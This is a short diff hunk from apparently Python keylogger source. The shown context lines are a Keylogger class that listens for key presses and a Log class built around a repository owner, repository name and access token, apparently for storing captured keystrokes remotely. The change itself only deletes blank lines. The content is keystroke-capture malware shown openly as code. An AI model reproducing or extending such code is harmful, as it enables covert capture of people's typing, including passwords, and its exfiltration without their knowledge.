@@ -40,9 +40,6 @@ class Keylogger():
         with Listener(on_press=on_press) as listener:
             listener.join()
 
-	
-
-
 class Log():
     def __init__(self, repository_owner, repository_name, access_token):
         self.repository_owner = repository_owner
